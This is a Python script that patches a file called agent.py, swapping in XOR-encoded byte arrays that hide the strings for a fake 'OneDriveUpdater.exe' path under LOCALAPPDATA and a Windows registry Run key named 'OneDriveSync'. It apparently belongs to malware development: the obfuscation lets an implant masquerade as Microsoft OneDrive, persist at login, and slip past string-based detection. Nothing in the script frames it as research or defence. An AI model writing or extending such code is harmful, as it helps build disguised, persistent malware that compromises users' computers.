#!/usr/bin/env python3
"""Patch agent.py with correct XOR-encoded byte arrays"""
import re

K = 0x5A
def enc(s): return str([c ^ K for c in s.encode()])

# Generate correct values
P1  = enc('LOCALAPPDATA')
P2  = enc('Microsoft')
P3  = enc('OneDrive')
P4  = enc('OneDriveUpdater.exe')
Soft= enc('Software')
Win = enc('Windows')
CV  = enc('CurrentVersion')
Run = enc('Run')
ODS = enc('OneDriveSync')

agent = open('agent.py', 'r', encoding='utf-8').read()

# Replace _P1..._P4 lines
agent = re.sub(r'_P1\s*=\s*\[.*?\].*\n', f'_P1 = {P1}  # XOR->LOCALAPPDATA\n', agent)
agent = re.sub(r'_P2\s*=\s*\[.*?\].*\n', f'_P2 = {P2}  # XOR->Microsoft\n', agent)
agent = re.sub(r'_P3\s*=\s*\[.*?\].*\n', f'_P3 = {P3}  # XOR->OneDrive\n', agent)
agent = re.sub(r'_P4\s*=\s*\[.*?\].*\n', f'_P4 = {P4}  # XOR->OneDriveUpdater.exe\n', agent)

# Replace inline XOR arrays in _write_reg
agent = re.sub(r'_xd\(\[9,53,6,42,56,51,59,47\]\)', f'_xd({Soft})', agent)
agent = re.sub(r'_xd\(\[29,55,63,35,54,55,57,63\]\)', f'_xd({Win})', agent)
agent = re.sub(r'_xd\(\[25,47,56,56,47,63,40,94,47,56,57,55,55,63\]\)', f'_xd({CV})', agent)
agent = re.sub(r'_xd\(\[8,47,52\]\)', f'_xd({Run})', agent)
agent = re.sub(r'_vname\s*=\s*_xd\(\[.*?\]\).*\n', f'        _vname = _xd({ODS})  # OneDriveSync\n', agent)

open('agent.py', 'w', encoding='utf-8').write(agent)

# Verify
def _xd(s): return ''.join(chr(c ^ K) for c in s)
import ast
vars = {'P1': P1,'P2': P2,'P3': P3,'P4': P4}
for k,v in vars.items():
    decoded = _xd(ast.literal_eval(v))
    print(f'{k}: {decoded}')
print('Registry:', '\\'.join([_xd(ast.literal_eval(Soft)), _xd(ast.literal_eval(P2)), _xd(ast.literal_eval(Win)), _xd(ast.literal_eval(CV)), _xd(ast.literal_eval(Run))]))
print('ValName:', _xd(ast.literal_eval(ODS)))
print('\nPatch applied successfully!')
